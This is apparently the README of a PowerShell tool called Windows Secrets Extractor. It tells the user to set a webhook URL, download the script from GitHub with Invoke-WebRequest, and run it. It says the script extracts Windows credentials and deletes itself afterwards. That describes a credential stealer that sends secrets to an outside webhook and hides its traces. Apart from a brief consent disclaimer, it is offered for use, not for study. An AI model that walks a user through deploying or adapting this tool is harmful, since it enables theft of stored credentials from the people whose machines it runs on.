# Windows Secrets Extractor


### Requirements
- PowerShell **CredentialManager** Module : ``Install-Module -Name CredentialManager``
- (Optionnal) Python 3.X


### Before Usage
- Adapt line 1 and enter your WebHook URL.

***

### Usage
1. Download the script :

```
Invoke-WebRequest https://raw.githubusercontent.com/danglock/Windows-Secrets-Extractor/main/extractor.ps1 -outfile $env:USERPROFILE\extractor.ps1
```

3. Run the Script :

```
cd $env:USERPROFILE;.\extractor.ps1
```

Note: the script will auto-destroy after execution

***
Be careful, I am not responsible for your use of this script.
Please do not use it against machines whose owner has not given you their consent
